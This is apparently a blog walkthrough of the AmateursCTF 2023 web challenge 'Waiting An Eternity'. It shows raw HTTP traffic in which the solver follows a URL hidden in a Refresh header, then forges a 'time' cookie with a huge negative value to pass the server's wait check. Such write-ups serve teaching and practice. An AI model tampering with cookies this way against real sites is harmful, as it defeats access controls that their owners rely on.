---
title: "Waiting An Eternity"
date: 2014-01-16 00:00:00 +0800
categories: [Walkthrough, AmateursCTF]
tags: [AmateursCTF2023]
---

## Challenge Details
- Platform: [AmateursCTF](/categories/amateursctf/)
- Event: [AmateursCTF 2023](/tags/amateursctf2023/)

## Challenge Setting
The setting for the challenge is:
> My friend sent me this website and said that if I wait long enough, I could get and flag! Not that I need a flag or anything, but I've been waiting a couple days and it's still asking me to wait. I'm getting a little impatient, could you help me get the flag?


It seems this challenge involves bypassing mechanisms the server uses to keep track of time.

Let's have a look at the website!

## Walkthrough
The website is just some text saying "just wait an eternity".
The first request's HTTP headers looks like this:
```http
GET / HTTP/2
Host: waiting-an-eternity.amt.rs
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

The response to this request (shown below) shows us something interesting.
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 15 Jul 2023 22:42:42 GMT
Refresh: 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000; url=/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a
Server: gunicorn
Content-Length: 21

just wait an eternity
```

The `Refresh` header specifies a time interval (in seconds) after which the client should refresh the page automatically. 

However, the value in this response is an extremely large number, indicating the client should wait an incredibly long time, some might say an eternity, before refreshing. 

The URL part (`url=/secret-site?secretcode=...`) provides the location the client should refresh to when the time comes. The provided URL is `/secret-site` with a query parameter `secretcode` set to a long string.

Lets use this URL (`https://waiting-an-eternity.amt.rs/secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a`) directly in the browser to bypass the refresh mechanism.

```http
GET /secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a HTTP/2
Host: waiting-an-eternity.amt.rs
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Sec-Purpose: prefetch;prerender
Purpose: prefetch
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

Now the website greets us with the message "welcome. please wait another eternity.".

If we take a look at the HTTP response for that page, we can see a cookie has been set on our client.

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 15 Jul 2023 22:22:53 GMT
Server: gunicorn
Set-Cookie: time=1689459773.1742544; Path=/
Content-Length: 38

welcome. please wait another eternity.
```

In simple terms, once a [[cookie]] has been set on the client, it will send that cookie in any following requests that match the domain name the cookie is set with.

If we refresh the page, we can see that the cookie is now being automatically added to our HTTP requests.

```http
GET /secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a HTTP/2
Host: waiting-an-eternity.amt.rs
Cookie: time=1689461033.309816
Cache-Control: max-age=0
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

The server picks up that there is a cookie set, and the response also changes, telling us how long we have waited in seconds.

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 15 Jul 2023 22:44:46 GMT
Server: gunicorn
Content-Length: 80

you have not waited an eternity. you have only waited 52.698566913604736 seconds
```

So lets manually change the cookies value!

If we try setting it to a super high number, the web app responds to us with this:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Date: Mon, 24 Jul 2023 04:01:06 GMT
Server: gunicorn
Content-Length: 66

you have not waited an eternity. you have only waited -inf seconds
```

So supposedly, we have gone over a threshold that makes the server tell us we have waited "-inf seconds".

But not an eternity... 🥲

Let's try passing the threshold again, but in the other direction, with a super high negative number!

```http
GET /secret-site?secretcode=5770011ff65738feaf0c1d009caffb035651bb8a7e16799a433a301c0756003a HTTP/2
Host: waiting-an-eternity.amt.rs
Cookie: time=-999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

And that's it! We bypassed eternity and get the flag!

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Date: Sat, 15 Jul 2023 22:27:11 GMT
Server: gunicorn
Content-Length: 59

amateursCTF{this_is_not_the_real_flag_btw}
```